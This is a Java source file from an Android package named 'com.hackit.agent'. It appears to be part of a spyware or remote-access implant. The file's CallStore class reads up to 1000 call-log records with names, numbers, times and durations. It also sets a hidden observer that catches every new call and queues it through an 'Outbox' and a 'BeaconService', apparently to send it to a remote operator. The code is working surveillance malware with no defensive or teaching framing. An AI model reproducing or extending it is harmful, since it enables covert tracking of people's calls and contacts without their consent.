package com.hackit.agent;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONObject;

/** Call-log dump plus a live observer for new calls. */
final class CallStore {
    private static ContentObserver observer;
    private static HandlerThread thread;
    private static long lastSeen;

    static JSONArray dump(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.READ_CALL_LOG)) {
            return rows;
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{
                    CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION
            }, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) {
                return rows;
            }
            int cap = Math.min(Math.max(limit, 1), 1000);
            while (cursor.moveToNext() && rows.length() < cap) {
                JSONObject row = new JSONObject();
                row.put("id", cursor.getLong(0));
                row.put("number", nullSafe(cursor.getString(1)));
                row.put("name", nullSafe(cursor.getString(2)));
                row.put("type", cursor.getInt(3));
                row.put("ts", cursor.getLong(4));
                row.put("duration", cursor.getLong(5));
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.e("calls dump: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    static synchronized void watch(final Context ctx) {
        if (observer != null) {
            return;
        }
        thread = new HandlerThread("calls-observer");
        thread.start();
        observer = new ContentObserver(new Handler(thread.getLooper())) {
            @Override
            public void onChange(boolean selfChange) {
                try {
                    JSONArray rows = since(ctx, 20);
                    if (rows.length() > 0) {
                        Outbox.event("call", rows);
                        BeaconService.poke(ctx);
                    }
                } catch (Throwable exc) {
                    Log.d("call observe: " + exc);
                }
            }
        };
        ctx.getContentResolver().registerContentObserver(CallLog.Calls.CONTENT_URI, true, observer);
        Log.d("call observer on");
    }

    private static JSONArray since(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{
                    CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION
            }, CallLog.Calls._ID + " > ?", new String[]{String.valueOf(lastSeen)}, CallLog.Calls._ID + " ASC");
            if (cursor == null) {
                return rows;
            }
            while (cursor.moveToNext() && rows.length() < limit) {
                long id = cursor.getLong(0);
                lastSeen = Math.max(lastSeen, id);
                JSONObject row = new JSONObject();
                row.put("id", id);
                row.put("number", nullSafe(cursor.getString(1)));
                row.put("name", nullSafe(cursor.getString(2)));
                row.put("type", cursor.getInt(3));
                row.put("ts", cursor.getLong(4));
                row.put("duration", cursor.getLong(5));
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.d("call since: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    private static String nullSafe(String value) {
        return value == null ? "" : value;
    }

    static ContentResolver resolver(Context ctx) {
        return ctx.getContentResolver();
    }

    private CallStore() {
    }

    static {
        lastSeen = 0L;
    }

    static Uri uri() {
        return CallLog.Calls.CONTENT_URI;
    }
}
